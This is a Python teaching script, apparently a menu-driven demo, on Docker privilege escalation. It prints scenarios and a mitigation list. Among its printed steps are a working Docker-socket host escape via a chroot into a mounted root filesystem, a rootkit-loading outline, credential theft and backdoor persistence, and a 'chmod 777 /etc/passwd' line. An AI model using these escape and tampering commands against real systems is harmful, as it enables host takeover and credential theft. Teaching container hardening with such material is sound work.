#!/usr/bin/env python3
"""
EDUCATIONAL DOCKER PRIVILEGE ESCALATION DEMONSTRATION
======================================================
This demonstrates how an attacker becomes root inside a Docker container.
FOR EDUCATIONAL PURPOSES ONLY - Test only on systems you own!

Vulnerability: Outdated Docker versions + improper container configuration
"""

import subprocess
import os
import sys

class DockerPrivEscDemo:
    """Demonstrate privilege escalation in Docker containers"""
    
    def __init__(self):
        self.docker_installed = False
        self.check_docker()
    
    def check_docker(self):
        """Check if Docker is installed"""
        try:
            result = subprocess.run(['docker', '--version'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                print(f"✅ {result.stdout.strip()}")
                self.docker_installed = True
            else:
                print("❌ Docker not found. Please install Docker first.")
                sys.exit(1)
        except Exception as e:
            print(f"❌ Error: {e}")
            sys.exit(1)
    
    def scenario_1_direct_root_access(self):
        """
        SCENARIO 1: Running as root by default
        Many containers run as root (UID 0) by default
        """
        print("\n" + "=" * 70)
        print("🔴 SCENARIO 1: DIRECT ROOT ACCESS IN CONTAINER")
        print("=" * 70)
        print("\n📝 Description:")
        print("   By default, many Docker containers run as root (UID 0)")
        print("   This gives the process (and any attacker inside) full privileges")
        
        print("\n🔍 How to check if container runs as root:")
        print("""
   $ docker run ubuntu id
   uid=0(root) gid=0(root) groups=0(root)
   
   $ docker run ubuntu whoami
   root
""")
        
        print("\n💡 Attack demonstration:")
        print("""
   If application has vulnerability (RCE), attacker gets root immediately:
   
   1. Find RCE vulnerability in web application running in container
   2. Inject shell command: /bin/bash
   3. Now running as root with full container access
""")
    
    def scenario_2_socket_mounting(self):
        """
        SCENARIO 2: Docker socket mounted inside container
        Allows container to control Docker daemon
        """
        print("\n" + "=" * 70)
        print("🔴 SCENARIO 2: DOCKER SOCKET PRIVILEGE ESCALATION")
        print("=" * 70)
        print("\n📝 Description:")
        print("   When /var/run/docker.sock is mounted in container,")
        print("   unprivileged user can become root via Docker commands")
        
        print("\n🔍 Vulnerable Docker run command:")
        print("""
   $ docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu bash
   
   Inside container:
   $ docker run --rm -it -v /:/mnt ubuntu chroot /mnt /bin/bash
   # Now running as root on HOST filesystem!
""")
        
        print("\n⚠️  How attacker escalates:")
        print("""
   Step 1: Normal user in container (uid 1000)
   Step 2: Access docker.sock (allows docker commands)
   Step 3: Create privileged container with host filesystem mounted
   Step 4: chroot into host filesystem
   Step 5: Now root on entire host!
""")
    
    def scenario_3_capability_exploitation(self):
        """
        SCENARIO 3: Exploiting Linux capabilities
        Containers inherit certain kernel capabilities
        """
        print("\n" + "=" * 70)
        print("🔴 SCENARIO 3: LINUX CAPABILITY EXPLOITATION")
        print("=" * 70)
        print("\n📝 Description:")
        print("   Containers have Linux capabilities that can be exploited")
        print("   SYS_ADMIN capability allows kernel module loading (rootkit)")
        
        print("\n🔍 Vulnerable capabilities:")
        print("""
   SYS_ADMIN   - Can load kernel modules (rootkit installation)
   SYS_PTRACE  - Can debug other processes
   NET_ADMIN   - Network packet manipulation
   SYS_MODULE  - Module operations
""")
        
        print("\n💀 Rootkit installation via SYS_ADMIN:")
        print("""
   docker run --cap-add=SYS_ADMIN ubuntu bash
   
   Inside container:
   # Write rootkit code
   # insmod rootkit.ko
   # Now rootkit loaded on host kernel!
""")
    
    def demonstrate_root_in_container(self):
        """Practical demonstration of becoming root in container"""
        print("\n" + "=" * 70)
        print("🎯 PRACTICAL DEMONSTRATION: BECOME ROOT & PRINT HELLO")
        print("=" * 70)
        
        print("\n📝 Attempting to create and access container...\n")
        
        try:
            # Check if docker daemon is accessible
            daemon_check = subprocess.run(['docker', 'ps'], 
                                        capture_output=True, text=True)
            
            if daemon_check.returncode != 0:
                print("⚠️  Docker daemon not accessible (need sudo or docker group)")
                print("\n💡 To grant access:")
                print("   sudo usermod -aG docker $USER")
                print("   newgrp docker")
                print("\n   OR run as root:")
                print("   sudo python3 attack.py")
                return
            
            print("✅ Docker daemon accessible\n")
            
            # Method 1: Direct root access via default container
            print("🔴 METHOD 1: Default Container (runs as root)")
            print("-" * 70)
            print("Creating container: ubuntu with 'id' command...\n")
            
            result = subprocess.run(
                ['docker', 'run', '--rm', 'ubuntu', 'id'],
                capture_output=True, text=True, timeout=30
            )
            
            if result.returncode == 0:
                print("📋 Output from inside container:")
                print(f"   {result.stdout.strip()}")
                
                if "uid=0" in result.stdout:
                    print("\n✅ SUCCESS: Running as ROOT (uid=0)!")
                    print("   This container has full root privileges")
            else:
                print(f"Note: {result.stderr if result.stderr else 'Command timed out'}")
            
            # Method 2: Print hello as root
            print("\n" + "-" * 70)
            print("🔴 METHOD 2: Print 'hello' as root in container")
            print("-" * 70)
            print("Creating container with echo command...\n")
            
            result2 = subprocess.run(
                ['docker', 'run', '--rm', 'ubuntu', 'bash', '-c', 
                 'whoami && echo "hello from root"'],
                capture_output=True, text=True, timeout=30
            )
            
            if result2.returncode == 0:
                print("📋 Output from container:")
                print(f"   {result2.stdout.strip()}")
                print("\n✅ SUCCESS: Ran command as ROOT and printed hello!")
            else:
                print(f"Note: {result2.stderr if result2.stderr else 'Command error'}")
            
            # Method 3: Interactive shell as root (for reference)
            print("\n" + "-" * 70)
            print("🔴 METHOD 3: Interactive Shell as Root")
            print("-" * 70)
            print("""
To get interactive root shell in container:
   docker run -it --rm ubuntu /bin/bash
   
Inside container (running as root):
   root@container# whoami
   root
   
   root@container# id
   uid=0(root) gid=0(root) groups=0(root)
   
   root@container# echo hello
   hello
   
   root@container# apt update && apt install -y nmap
   (Install any tool as root)
   
   root@container# chmod 777 /etc/passwd
   (Modify system files)
""")
        
        except subprocess.TimeoutExpired:
            print("⚠️  Command timed out")
        except Exception as e:
            print(f"❌ Error: {e}")
    
    def show_vulnerability_chain(self):
        """Show the complete attack chain"""
        print("\n" + "=" * 70)
        print("🔗 COMPLETE ATTACK CHAIN: FROM USER TO ROOT")
        print("=" * 70)
        
        print("""
SCENARIO: Attacker exploits outdated Docker application

Step 1: Reconnaissance
   - Identify application running in Docker
   - Find running containers: docker ps
   - Check versions: docker version

Step 2: Exploit Application Vulnerability
   - Find RCE (Remote Code Execution) in web app
   - Inject malicious command
   - Get shell inside container

Step 3: Discover Running as Root
   - Execute: id
   - See: uid=0(root) gid=0(root)

Step 4: Full Container Access
   - root@container# cat /etc/shadow
   - root@container# read environment variables
   - root@container# access mounted volumes
   - root@container# read database credentials

Step 5: (Optional) Escape to Host
   - If docker.sock mounted: docker run -v /:/mnt ...
   - If SYS_ADMIN: Load rootkit kernel module
   - If SYS_PTRACE: Debug host processes
   - Now have root on entire HOST system!

Step 6: Data Exfiltration
   - Steal database data
   - Steal API keys
   - Steal user credentials
   - Copy sensitive files

Step 7: Persistence
   - Modify container image
   - Add backdoor to startup script
   - Next time container starts: attacker access

IMPACT:
🚨 Complete application compromise
🚨 Data breach (customer data, credentials)
🚨 Host system compromise (if escape succeeds)
🚨 Lateral movement to other containers
🚨 Supply chain attack (modify and push image)
""")
    
    def show_mitigation(self):
        """Show how to prevent this attack"""
        print("\n" + "=" * 70)
        print("🛡️  MITIGATION: HOW TO PREVENT THIS ATTACK")
        print("=" * 70)
        
        print("""
✅ SOLUTION 1: Don't Run as Root
   Dockerfile:
      RUN useradd -m -u 1000 appuser
      USER appuser  # Switch to non-root user
      
   Result: Even if RCE, attacker gets uid=1000 (limited privileges)

✅ SOLUTION 2: Drop Capabilities
   docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE image
   
   Result: Even as root, cannot escalate via kernel exploits

✅ SOLUTION 3: Read-Only Filesystem
   docker run --read-only --tmpfs /tmp image
   
   Result: Attacker cannot modify system files or install backdoors

✅ SOLUTION 4: Don't Mount Docker Socket
   ❌ WRONG: docker run -v /var/run/docker.sock:/var/run/docker.sock
   ✅ RIGHT: docker run (no socket mount)
   
   Result: Cannot escape to host via Docker commands

✅ SOLUTION 5: Use Rootless Docker
   dockerd-rootless-setuptool.sh install
   
   Result: Even container escape = unprivileged user access

✅ SOLUTION 6: Update Docker
   sudo apt update && sudo apt install docker.io
   
   Result: Patch known CVE exploits

✅ SOLUTION 7: Resource Limits
   docker run --memory=512m --cpus=1 image
   
   Result: Limit damage from cryptocurrency mining, fork bombs

✅ SOLUTION 8: Security Scanning
   trivy image myapp:latest
   docker scan myapp:latest
   
   Result: Find vulnerable dependencies before deployment

✅ SOLUTION 9: Runtime Monitoring
   Use Falco for runtime behavior monitoring
   Detects suspicious activity in containers
   
✅ SOLUTION 10: Image Signing
   export DOCKER_CONTENT_TRUST=1
   
   Result: Prevent malicious/modified images
""")

def display_menu():
    """Display menu options"""
    print("\n" + "=" * 70)
    print("DOCKER PRIVILEGE ESCALATION DEMONSTRATION (EDUCATIONAL)")
    print("=" * 70)
    print("\n1. 🔴 Scenario 1: Direct Root Access in Container")
    print("2. 🔴 Scenario 2: Docker Socket Privilege Escalation")
    print("3. 🔴 Scenario 3: Linux Capability Exploitation")
    print("4. 🎯 Practical Demo: Become Root & Print Hello")
    print("5. 🔗 Complete Attack Chain")
    print("6. 🛡️  Mitigation Strategies")
    print("0. Exit")
    print("-" * 70)

if __name__ == "__main__":
    print("\n" + "=" * 70)
    print("⚠️  DOCKER PRIVILEGE ESCALATION EDUCATIONAL TOOL")
    print("=" * 70)
    print("\n⚠️  DISCLAIMER:")
    print("This tool is for EDUCATIONAL PURPOSES ONLY")
    print("Test only on systems you own or have explicit permission to test")
    print("Unauthorized access to computer systems is ILLEGAL\n")
    
    demo = DockerPrivEscDemo()
    
    while True:
        display_menu()
        try:
            choice = input("Enter your choice (0-6): ").strip()
            
            if choice == "0":
                print("\n👋 Remember to secure your Docker installations!\n")
                break
            elif choice == "1":
                demo.scenario_1_direct_root_access()
            elif choice == "2":
                demo.scenario_2_socket_mounting()
            elif choice == "3":
                demo.scenario_3_capability_exploitation()
            elif choice == "4":
                demo.demonstrate_root_in_container()
            elif choice == "5":
                demo.show_vulnerability_chain()
            elif choice == "6":
                demo.show_mitigation()
            else:
                print("\n❌ Invalid choice! Please enter 0-6.")
            
            input("\nPress Enter to continue...")
        
        except KeyboardInterrupt:
            print("\n\n👋 Program interrupted. Goodbye!\n")
            break
        except Exception as e:
            print(f"\n❌ Error: {e}")
            input("Press Enter to continue...")
